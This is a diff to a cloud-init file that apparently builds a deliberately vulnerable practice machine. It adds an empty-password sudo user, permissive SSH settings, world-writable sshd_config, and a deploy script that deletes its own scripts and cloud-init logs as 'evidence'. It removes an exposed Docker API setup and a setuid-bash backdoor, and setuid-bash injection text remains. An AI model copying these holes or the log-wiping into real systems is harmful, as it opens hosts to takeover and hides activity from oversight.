@@ -5,15 +5,15 @@ users:
   - name: timmy
     shell: /bin/bash
     lock_passwd: false
-    ssh_authorized_keys:
-      - "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDVj+C4oF8dW6oZMGeqEmcnftVVgSRtbmj8/y/9cnc7H kedowsl@DESKTOP-77DQ24L"
 
   - name: lizzie
     shell: /bin/bash
     lock_passwd: false
 
   - name: ken
+    sudo: ["ALL=(ALL) NOPASSWD:ALL"]
     shell: /bin/bash
+    passwd: ""
     lock_passwd: false
 
   - name: system
@@ -28,7 +28,6 @@ users:
     groups: [sudo, adm]
     lock_passwd: false
     
-
   - name: ftpd
     shell: /bin/bash
     groups: [ftp]
@@ -51,7 +50,6 @@ chpasswd:
   list: |
     timmy:timmy
     lizzie:lizzie
-    ken:ken
     system:system
     rtkit:rtkit
     ftpd:ftpd
@@ -294,7 +292,6 @@ write_files:
 
       "/usr/local/apache2/bin/apachectl" start
 
-
   - path: /usr/local/sbin/authorised_keys.sh
     owner: root:root
     permissions: '0755'
@@ -387,117 +384,6 @@ write_files:
       sudo tail -n 1 /var/log/cron-cleanup.log
 
       echo "Setup complete! Vuln ready: Edit $SCRIPT_PATH as low-priv user to inject (e.g., os.system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')) > Wait 10 min > /tmp/rootbash -p."
-
-  - path: /usr/local/sbin/docker_install.sh
-    permissions: '0755'
-    owner: root:root
-    content: |
-      #!/usr/bin/env bash
-
-      set -e
-
-      if [[ "$EUID" -ne 0 ]]; then
-        echo "Run as root!"
-        exit 1
-      fi
-
-      apt-get update
-      apt-get install ca-certificates curl -y
-      install -m 0755 -d /etc/apt/keyrings
-      curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
-      chmod a+r /etc/apt/keyrings/docker.asc
-      echo   "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
-        $(. /etc/os-release && echo "${UBUNTU_CODENAME:-$VERSION_CODENAME}") stable" |   sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
-      apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin -y
-      docker run hello-world
-
-      docker_script="/usr/local/bin/docker_script.sh"
-
-      cat << "EOF" > "$docker_script"
-      #!/usr/bin/env bash
-
-      chmod 777 /var/run/docker.sock
-      chmod 777 /var/run/debugging.sock
-      EOF
-
-      chmod +x "$docker_script"
-
-      cat << "EOF" > "/usr/lib/systemd/system/docker.service"
-      [Unit]
-      Description=Docker Application Container Engine
-      Documentation=https://docs.docker.com
-      After=network-online.target nss-lookup.target docker.socket firewalld.service containerd.service time-set.target
-      Wants=network-online.target containerd.service
-      Requires=docker.socket
-      StartLimitBurst=3
-      StartLimitIntervalSec=60
-
-      [Service]
-      Type=notify
-      # the default is not to use systemd for cgroups because the delegate issues still
-      # exists and systemd currently does not support the cgroup feature set required
-      # for containers run by docker
-      ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock -H unix:///var/run/debugging.sock -H tcp://0.0.0.0:2375
-      ExecReload=/bin/kill -s HUP $MAINPID
-      TimeoutStartSec=0
-      RestartSec=2
-      Restart=always
-
-      # Having non-zero Limit*s causes performance problems due to accounting overhead
-      # in the kernel. We recommend using cgroups to do container-local accounting.
-      LimitNPROC=infinity
-      LimitCORE=infinity
-
-      # Comment TasksMax if your systemd version does not support it.
-      # Only systemd 226 and above support this option.
-      TasksMax=infinity
-
-      # set delegate yes so that systemd does not reset the cgroups of docker containers
-      Delegate=yes
-
-      # kill only the docker process, not all processes in the cgroup
-      KillMode=process
-      OOMScoreAdjust=-500
-
-      [Install]
-      WantedBy=multi-user.target
-      EOF
-
-      cat << "EOF" > "/usr/lib/systemd/system/docker.socket"
-      [Unit]
-      Description=Docker Socket for the API
-
-      [Socket]
-      # If /var/run is not implemented as a symlink to /run, you may need to
-      # specify ListenStream=/var/run/docker.sock instead.
-      ListenStream=/run/docker.sock
-      SocketMode=0777
-      SocketUser=root
-      SocketGroup=docker
-
-      [Install]
-      WantedBy=sockets.target
-      EOF
-
-      cat << EOF > "/etc/systemd/system/docker_chmod.service"
-      [Unit]
-      Description=Easy docker access
-      Requires=docker.service
-      After=docker.service
-
-      [Service]
-      Type=simple
-      ExecStart=$docker_script
-
-      [Install]
-      WantedBy=multi-user.target
-      EOF
-
-
-      systemctl daemon-reload
-      systemctl enable --now docker_chmod
-      $docker_script
-      systemctl enable --now docker
 
   - path: /usr/local/sbin/edit_PAM.sh
     permissions: '0755'
@@ -820,144 +706,23 @@ write_files:
       systemctl daemon-reload
       systemctl restart postgresql
 
-  - path: /usr/local/sbin/unbound.sh
-    owner: root:root
-    permissions: '0755'
-    content: |
-      #!/bin/bash
-
-      set -e
-
-      echo "Setting up Unbound DNS resolver with root Python module vulnerability..."
-
-      # Install dependencies (python-is-python3 first for configure)
-      sudo apt update
-      sudo apt install -y python-is-python3 python3-dev libpython3-dev build-essential wget swig libssl-dev
-
-      # Remove system Unbound to avoid conflicts
-      sudo apt remove -y unbound python3-unbound || true
-
-      # Build/install Unbound with Python module
-      cd /tmp
-      rm -rf unbound-1.20.0 unbound-1.20.0.tar.gz
-      wget https://www.nlnetlabs.nl/downloads/unbound/unbound-1.20.0.tar.gz
-      tar -xzf unbound-1.20.0.tar.gz
-      cd unbound-1.20.0
-      ./configure --with-pythonmodule --enable-pie --enable-relro-now
-      make -j$(nproc)
-      sudo make install
-      sudo ldconfig
-
-      # Copy Python module to system site-packages (ensure import works)
-      sudo mkdir -p /usr/lib/python3/dist-packages
-      sudo find /usr/local -name "unboundmodule.py" -exec sudo cp {} /usr/lib/python3/dist-packages/unbound.py \; || true
-      sudo find /usr/local -name "unboundmod.so" -exec sudo cp {} /usr/lib/python3/dist-packages/unboundmod.so \; || true
-      sudo ldconfig
-
-      cd ..
-      rm -rf unbound-1.20.0 unbound-1.20.0.tar.gz
-
-      # Setup config dir
-      sudo mkdir -p /etc/unbound
-
-      # Create vuln_module.py (writable, full API)
-      sudo tee /etc/unbound/vuln_module.py > /dev/null << 'EOF'
-      import unbound
-      import os
-      def init(id, ctx):
-          return True
-      def operate(id, event, qstate, qdata):
-          if event == unbound.MODULE_EVENT_NEW or event == unbound.MODULE_EVENT_PASS:
-              if 'vuln' in qstate.qinfo.qname_str:
-                  os.system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')
-              qstate.ext_state[id] = unbound.MODULE_FINISHED
-          return True
-      def inform_super(id, qstate, superqstate, qdata):
-          return True
-      def deinit(id):
-          return True
-      EOF
-
-      sudo chmod 777 /etc/unbound/vuln_module.py
-
-      # FIX: Ensure the directory for root.hints exists before downloading.
-      sudo mkdir -p /usr/share/dns
-
-      # Download root hints
-      sudo wget -O /usr/share/dns/root.hints https://www.internic.net/domain/named.root
-      sudo unbound-anchor -a /etc/unbound/root.key || true
-
-      # Create unbound.conf
-      sudo tee /etc/unbound/unbound.conf > /dev/null << 'EOF'
-      server:
-          interface: 0.0.0.0
-          port: 53
-          do-ip4: yes
-          do-ip6: no
-          do-udp: yes
-          do-tcp: yes
-          root-hints: "/usr/share/dns/root.hints"
-          module-config: "python iterator"
-          username: root
-          chroot: ""
-      python:
-          python-script: "/etc/unbound/vuln_module.py"
-      EOF
-
-      sudo unbound-checkconf /etc/unbound/unbound.conf
-
-      # Stop/disable systemd-resolved to free port 53
-      sudo systemctl stop systemd-resolved || true
-      sudo systemctl disable systemd-resolved || true
-      sudo systemctl stop systemd-resolved.socket || true
-      sudo systemctl disable systemd-resolved.socket || true
-
-      # Unlock resolv.conf if immutable, then replace
-      sudo chattr -i /etc/resolv.conf || true
-      sudo rm -f /etc/resolv.conf
-      sudo tee /etc/resolv.conf > /dev/null << 'EOF'
-      nameserver 8.8.8.8
-      nameserver 8.8.4.4
-      EOF
-      sudo chattr +i /etc/resolv.conf
-
-      # Create custom systemd service for built Unbound (Type=forking with PIDFile)
-      sudo tee /etc/systemd/system/unbound-custom.service > /dev/null << 'EOF'
-      [Unit]
-      Description=Unbound DNS Server (Custom Build)
-      After=network.target
-
-      [Service]
-      Type=forking
-      User=root
-      PIDFile=/var/run/unbound.pid
-      ExecStart=/usr/local/sbin/unbound -c /etc/unbound/unbound.conf
-      ExecReload=/bin/kill -HUP $MAINPID
-      KillMode=mixed
-      Restart=on-failure
-      RestartSec=5s
-
-      [Install]
-      WantedBy=multi-user.target
-      EOF
-
-      sudo systemctl daemon-reload
-      sudo systemctl enable unbound-custom
-      sudo systemctl start unbound-custom
-
-      echo "Setup complete! Unbound runs as root with vuln Python module. Test: dig @127.0.0.1 vuln.example.com > ls -l /tmp/rootbash > /tmp/rootbash -p."
 
   - path: /home/system/deploy.sh
     owner: root:root
     permissions: '0755'
     content: |
-      #!/bin/bash
-      # Purpose: Executes a sequence of setup/vulnerability scripts and checks the exit status of each.
-      #
-      # Usage: 
-      # 1. Place all target scripts (apache_install.sh, etc.) into a folder named 'vulnerability_scripts'.
-      # 2. Run this script with: sudo bash deployment_manager.sh
+      #!/usr/bin/env bash
+      # Path: /home/system/deploy.sh
+      # Purpose: Executes a sequence of setup/vulnerability scripts and performs aggressive cleanup,
+      #          removing all evidence (scripts, logs, and self-destructing) after execution.
       # ------------------------------------------------------------------------------------------------
+
+      set -e
+
+      if [[ "$EUID" -ne 0 ]]; then
+          echo "Run as root!"
+          exit 1
+      fi
 
       # --- Configuration ---
 
@@ -969,18 +734,17 @@ write_files:
           "apache_install.sh"
           "authorised_keys.sh"
           "CronJobs.sh"
-          "docker_install.sh"
           "edit_PAM.sh"
           "Extra_Users_Permissions.sh"
           "mariadbscript.sh"
           "nginx_runs_as_root.sh"
           "permissionsscript.sh"
           "PostgreSQL.sh"
-          "unbound.sh"
       )
 
       # Define the log file name. It includes a timestamp for easy tracking.
-      LOG_FILE="deployment_$(date +%Y%m%d_%H%M%S).log"
+      # Using /tmp for the log file location to ensure it's easily deletable.
+      LOG_FILE="/tmp/deployment_$(date +%Y%m%d_%H%M%S).log"
 
       # --- Functions ---
 
@@ -1007,7 +771,6 @@ write_files:
           fi
 
           # 2. Execute the script. Output (including errors) is logged.
-          # We explicitly run it with 'bash' to ensure consistent execution environment.
           bash "$full_path" >> "$LOG_FILE" 2>&1
           local exit_status=$?
 
@@ -1020,6 +783,30 @@ write_files:
               echo "FAILURE DETAILS: Check the log file $LOG_FILE for execution output." | tee -a "$LOG_FILE"
               return 1
           fi
+      }
+
+      # Function to remove all deployment evidence and deployed scripts
+      cleanup_artifacts() {
+          echo "==================================================" | tee -a "$LOG_FILE"
+          echo "--- STARTING EVIDENCE REMOVAL (CLEANUP) ---" | tee -a "$LOG_FILE"
+
+          # --- 1. Remove deployed vulnerability scripts ---
+          echo "Removing deployed vulnerability scripts from $SCRIPT_DIR..." | tee -a "$LOG_FILE"
+          # Iterate through the script list and delete each file
+          for script in "${SCRIPTS[@]}"; do
+              rm -f "$SCRIPT_DIR/$script" 2>/dev/null
+          done
+          echo "Vulnerability scripts cleaned up." | tee -a "$LOG_FILE"
+
+          # --- 2. Remove Cloud-Init and common boot logs ---
+          echo "Removing Cloud-Init logs and related evidence..." | tee -a "$LOG_FILE"
+          # Use -f to suppress errors if files don't exist
+          rm -f /var/log/cloud-init.log /var/log/cloud-init-output.log 2>/dev/null
+          rm -f /var/log/cloud-init/* 2>/dev/null
+          echo "Cloud-Init logs cleared." | tee -a "$LOG_FILE"
+
+          echo "--- EVIDENCE REMOVAL COMPLETE ---" | tee -a "$LOG_FILE"
+          echo "==================================================" | tee -a "$LOG_FILE"
       }
 
       # --- Main Execution ---
@@ -1039,14 +826,10 @@ write_files:
               SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
           else
               FAILURE_COUNT=$((FAILURE_COUNT + 1))
-              # Note: By default, the script continues to the next file even if one fails.
-              # To stop execution on the first failure, uncomment the lines below:
-              # echo "Halting execution due to critical failure." | tee -a "$LOG_FILE"
-              # break
           fi
       done
 
-      # --- Summary Report ---
+      # --- Summary Report (Logged before deletion) ---
 
       echo "==================================================" | tee -a "$LOG_FILE"
       echo "--------------- DEPLOYMENT SUMMARY ---------------" | tee -a "$LOG_FILE"
@@ -1057,9 +840,26 @@ write_files:
       if [[ $FAILURE_COUNT -eq 0 ]]; then
           echo "STATUS: All vulnerability scripts ran successfully!" | tee -a "$LOG_FILE"
       else
-          echo "STATUS: WARNING - $FAILURE_COUNT script(s) failed. Review $LOG_FILE immediately." | tee -a "$LOG_FILE"
+          echo "STATUS: WARNING - $FAILURE_COUNT script(s) failed. Review log for details." | tee -a "$LOG_FILE"
       fi
       echo "==================================================" | tee -a "$LOG_FILE"
+
+
+      # --- FINAL STEP: CLEANUP AND SELF-DESTRUCT ---
+
+      # 1. Run the cleanup function to remove scripts and cloud-init logs
+      cleanup_artifacts
+
+      # 2. Remove the deployment manager's own log file
+      echo "Final step: Removing deployment log file: $LOG_FILE"
+      rm -f "$LOG_FILE" 2>/dev/null
+
+      # 3. Self-Destruct the deployment manager script
+      # $0 refers to the path of the currently executing script (/home/system/deploy.sh).
+      echo "Final step: Self-destructing deployment manager script ($0)..."
+      rm -f -- "$0"
+      exit 0
+
 
 
 # Package management
@@ -1088,9 +888,11 @@ packages:
   - lsb-release
   - apt-transport-https
   - software-properties-common
+  
 runcmd:
   # Wait for network
   - sh -c "sleep 10"
+  - echo "127.0.0.1 Ubuntu64x" >> /etc/hosts
 
   # Clean apt locks and configure dpkg
   - sh -c "rm -f /var/lib/dpkg/lock* /var/cache/apt/archives/lock || true"
@@ -1165,6 +967,21 @@ runcmd:
   # Misconfigured permissions
   - mkdir -p /var/www/html/uploads
   - chmod 777 /var/www/html/uploads
+  - chmod 0666 /etc/ssh/sshd_config
+
+  # SSH
+  # Set the maximum number of authentication tries extremely high (default is 6)
+  - sed -i 's/^#MaxAuthTries 6/MaxAuthTries 1000/' /etc/ssh/sshd_config
+  - sed -i 's/^MaxAuthTries 6/MaxAuthTries 1000/' /etc/ssh/sshd_config
+
+  # If a user exists and their password is set to 'empty' 
+  # (which is possible on some Linux/Unix systems), they can log in 
+  # without providing a password. This is a severe vulnerability.
+  - sed -i 's/^#PermitEmptyPasswords no/PermitEmptyPasswords yes/' /etc/ssh/sshd_config
+  - sed -i 's/^PermitEmptyPasswords no/PermitEmptyPasswords yes/' /etc/ssh/sshd_config
+  
+  # Restart SSH
+  - systemctl restart sshd
 
   # Log completion
   - [ sh -c "echo 'cloud-init run complete' >> /var/log/my-cloud-init.log" ]
